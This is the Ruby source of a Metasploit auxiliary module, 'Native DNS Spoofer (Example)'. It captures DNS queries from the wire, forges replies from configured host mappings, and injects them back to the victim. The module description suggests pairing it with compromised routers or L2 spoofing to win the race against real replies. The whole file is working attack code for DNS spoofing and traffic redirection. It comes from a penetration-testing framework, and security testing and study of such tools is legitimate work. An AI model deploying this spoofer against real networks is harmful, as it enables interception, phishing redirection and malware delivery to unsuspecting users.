##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Exploit::Remote::DNS::Client
  include Msf::Exploit::Remote::DNS::Server

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Native DNS Spoofer (Example)',
        'Description' => %q{
          This module provides a Rex based DNS service to resolve queries intercepted
          via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings
          desired for spoofing using a hostsfile or space/semicolon separated entries.
          In the default configuration, the service operates as a normal native DNS server
          with the exception of consuming from and writing to the wire as opposed to a
          listening socket. Best when compromising routers or spoofing L2 in order to
          prevent return of the real reply which causes a race condition. The method
          by which replies are filtered is up to the user (though iptables works fine).
        },
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => MSF_LICENSE,
        'References' => [],
        'Actions' => [
          [ 'Service', { 'Description' => 'Serve DNS entries' } ]
        ],
        'PassiveActions' => [
          'Service'
        ],
        'DefaultAction' => 'Service',
        'Notes' => {
          'Reliability' => [],
          'SideEffects' => [],
          'Stability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('FILTER', [false, 'The filter string for capturing traffic', 'dst port 53']),
        OptAddress.new('SRVHOST', [true, 'The local host to listen on for DNS services.', '127.0.2.2'])
      ]
    )

    deregister_options('PCAPFILE')
  end

  #
  # Wrapper for service execution and cleanup
  #
  def run
    start_service
    capture_traffic
    service.wait
  rescue Rex::BindFailed => e
    print_error "Failed to bind to port #{datastore['RPORT']}: #{e.message}"
  end

  def cleanup
    super
    @capture_thread.kill if @capture_thread
    close_pcap
  end

  #
  # Generates reply with src and dst reversed
  # Maintains original packet structure, proto, etc, changes ip_id
  #
  def reply_packet(pack)
    rep = pack.dup
    rep.eth_dst, rep.eth_src = rep.eth_src, rep.eth_dst
    rep.ip_dst, rep.ip_src = rep.ip_src, rep.ip_dst
    if pack.is_udp?
      rep.udp_dst, rep.udp_src = rep.udp_src, rep.udp_dst
    else
      rep.tcp_dst, rep.tcp_src = rep.tcp_src, rep.tcp_dst
    end
    rep.ip_id = StructFu::Int16.new(rand(2**16))
    return rep
  end

  #
  # Configures capture and handoff
  #
  def capture_traffic
    check_pcaprub_loaded
    ::Socket.do_not_reverse_lookup = true # Mac OS X workaround
    open_pcap({ 'FILTER' => datastore['FILTER'] })
    @capture_thread = Rex::ThreadFactory.spawn('DNSSpoofer', false) do
      each_packet do |pack|
        begin
          parsed = PacketFu::Packet.parse(pack)
        rescue StandardError => e
          vprint_status('PacketFu could not parse captured packet')
          elog('PacketFu could not parse captured packet', error: e)
        end

        begin
          reply = reply_packet(parsed)
          service.dispatch_request(reply, parsed.payload)
        rescue StandardError => e
          vprint_status('Could not process captured packet')
          elog('Could not process captured packet', error: e)
        end
      end
    end
  end

  #
  # Creates Proc to handle incoming requests
  #
  def on_dispatch_request(cli, data)
    return unless cli.is_a?(PacketFu::Packet)

    peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? cli.udp_dst.to_s : cli.tcp_dst.to_s)

    # Deal with non DNS traffic
    begin
      req = Packet.encode_drb(data)
    rescue StandardError => e
      print_error("Could not decode payload segment of packet from #{peer}, check log")
      dlog e.backtrace
      return
    end

    answered = []
    # Find cached items, remove request from forwarded packet
    req.question.each do |ques|
      cached = service.cache.find(ques.qname, ques.qtype.to_s)
      if cached.empty?
        next
      else
        cached.each do |subcached|
          req.add_answer(subcached) unless req.answer.include?(subcached)
        end

        answered << ques
      end
    end

    if (answered.count < req.question.count) && service.fwd_res
      if req.header.rd == 0
        vprint_status("Recursion forbidden in query for #{req.question.first.name} from #{peer}")
      else
        forward = req.dup
        forward.question.delete_if { |question| answered.include?(question) }
        begin
          forwarded = service.fwd_res.send(Packet.validate(forward))
        rescue NoResponseError
          vprint_error('Did not receive a response')
          return
        end

        unless service.cache.nil?
          forwarded.answer.each do |ans|
            rstring = ans.respond_to?(:address) ? "#{ans.name}:#{ans.address}" : ans.name
            vprint_status("Caching response #{rstring} #{ans.type}")
            service.cache.cache_record(ans)
          end
        end

        # Merge the answers and use the upstream response
        req.answer.each do |answer|
          forwarded.add_answer(answer) unless forwarded.answer.include?(answer)
        end
        req = forwarded
      end
    end

    req.header.qr = true
    service.send_response(cli, req.encode)
  end

  #
  # Creates Proc to handle outbound responses
  #
  def on_send_response(cli, data)
    return unless cli.is_a?(PacketFu::Packet)

    cli.payload = data
    cli.recalc
    inject cli.to_s
    sent_info(cli, data) if datastore['VERBOSE']
  end

  #
  # Prints information about spoofed packet after injection to reduce latency of operation
  # Shown to improve response time by >50% from ~1ms -> 0.3-0.4ms
  #
  def sent_info(cli, data)
    net = Packet.encode_net(data)
    peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? cli.udp_dst.to_s : cli.tcp_dst.to_s)
    asked = net.question.map { |q| q.qName.delete_suffix('.') }.join(', ')
    vprint_good("Sent packet with header:\n#{cli.inspect}")
    vprint_good("Spoofed records for #{asked} to #{peer}")
  end

end
